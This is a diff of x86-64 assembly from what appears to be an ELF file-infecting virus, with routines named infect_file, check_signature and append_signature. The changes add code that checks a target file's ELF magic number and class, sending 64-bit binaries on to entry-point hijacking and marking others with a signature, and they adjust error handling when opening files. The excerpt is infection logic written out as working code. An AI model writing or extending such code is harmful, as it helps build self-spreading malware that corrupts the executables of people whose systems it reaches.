@@ -5,7 +5,7 @@ infect_file:
     mov rax, SYS_OPEN
     syscall              ; open(filemane, O_RDWR)
     cmp rax, 0           ; if (fd < 0) return ;
-    js close_file
+    jl bad_fd
     mov [r12 + fd], rax
 get_file_data:
     mov rdi, [r12 + fd]
@@ -54,6 +54,24 @@ check_signature:
     jl check_signature_loop
     
 check_file_integrity:
+    mov rdi, [r12 + fileData]
+    cmp dword [rdi], 1179403647 ; magic number 0x7f454c46 464c457f
+	jnz simple
+	mov sil, [rdi + s_support]
+	cmp sil, 1			; cmp 32 bit
+	je simple
+	bit_64:
+    jmp get_file_entry
+
+	simple: 
+    mov rdi, [r12 + fileName]
+    call append_signature
+    jmp close_mmap
+
+
+
+
+get_file_entry:
     mov rax, [r12 + fileData]
     mov rdi, [rax + e_entry]
     mov [r12 + oldEntry], rdi
@@ -118,4 +136,5 @@ close_file:
     mov rdi, [r12 + fd]
     mov rax, SYS_CLOSE  
     syscall             ; close(fd)
+bad_fd:
     ret
